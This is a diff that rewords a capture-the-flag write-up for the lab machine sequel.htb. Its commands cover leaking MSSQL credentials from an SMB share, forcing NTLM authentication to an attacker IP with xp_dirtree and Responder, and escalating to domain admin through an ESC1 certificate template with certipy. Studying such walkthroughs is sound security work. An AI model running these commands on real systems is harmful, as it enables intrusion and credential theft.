@@ -108,54 +108,47 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-- No ldap anonymous bind
-
-SMB Guest user login - available:
-- `Public` share is readable
-- The share holds **SQL Server Procedures.pdf**
-
-The pdf holds the **username** and **password** of the MSSQL Server for a test account:
+No LDAP anonymous bind. SMB guest login is available though — the `Public` share is readable and holds **SQL Server Procedures.pdf**. The PDF contains a test account's **username** and **password** for the MSSQL Server:
 
 > `PublicUser - GuestUserCantWrite1`
 
 # User
 
-Login to MSSQL server:
+Log in to the MSSQL server:
 
 ```sh
 impacket-mssqlclient sequel.htb/PublicUser:'GuestUserCantWrite1'@10.129.228.253
 ```
 
-Find the host of the MSSQL server — set up responder:
+To force the SQL Server host to authenticate back to us, set up Responder:
 
 ```sh
 responder -i tun0
 ```
 
-- Try connecting to the attacker machine using **xp_dirtree**:
+Then point **xp_dirtree** at the attacker machine:
 
 ```sql
 > exec master..xp_dirtree '\\10.10.16.82\share\'
 ```
 
-- The username of the host with an NTLMV2 hash gets captured in responder
-- Hash cracked:
+Responder captures an NTLMv2 hash, and it cracks to:
 
 > `sql_svc - REGGIE1234ronnie`
 
-Gained shell using evil-winrm
+Gained a shell using evil-winrm.
 
-On `C:\` there's `C:\SQLServer` — and under it a `Logs` directory with an error log file **ERRORLOG.BAK**:
+Under `C:\SQLServer` sits a `Logs` directory holding an error log file, **ERRORLOG.BAK**:
 
 ```powershell
 ps > type C:\SQLServer\Logs\ERRORLOG.BAK
 ```
 
-- It reveals the username and password of the user ryan.. who fumbled a login attempt with creds:
+The log reveals the username and password of ryan, who fumbled a login attempt with his creds:
 
 > `Ryan.Cooper - NuclearMosquito3`
 
-Gained shell as Ryan.Cooper
+Gained a shell as Ryan.Cooper.
 
 # Root 
 
@@ -163,7 +156,7 @@ Gained shell as Ryan.Cooper
 ps > whoami /all
 ```
 
-- ryan is a member of the builtin **Certificate service DCOM Access** group
+Ryan is a member of the builtin **Certificate Service DCOM Access** group.
 
 ### Certipy-ad
 
@@ -173,7 +166,7 @@ ps > whoami /all
 certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -enabled 
 ```
 
-- Downloaded the vulnerable certificate details:
+The vulnerable certificate details:
 
 ```sh
 cat 20260918102434_Certipy.txt
@@ -217,18 +210,18 @@ Permissions
 ESC1                              : Enrollee supplies subject and template allows client authentication.
 ```
 
-- Got the CA name and template name — request a new certificate for admin using the vulnerable template:
+With the CA name and template name in hand, request a new certificate for admin using the vulnerable template:
 
 ```sh
 certipy-ad req -username Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication -upn Administrator@sequel.htb -dc-ip 10.129.228.253
 ```
 
-Gained the certificate and private key as `administrator.pfx`
+Gained the certificate and private key as `administrator.pfx`.
 
 ```sh
 faketime 'now -15 hours -56 minutes -03 seconds' certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb -dc-ip 10.129.228.253
 ```
 
-The `pfx` yields the kerberos authentication token (TGT) as `administrator.ccache` — and with **administrator.ccache** we dump the **NTLM hash** of the administrator (like secretsdump from impackets).
+The `pfx` yields a Kerberos authentication token (TGT) as `administrator.ccache`, which dumps the **NTLM hash** of the administrator the same way secretsdump does.
 
 Gained `root`
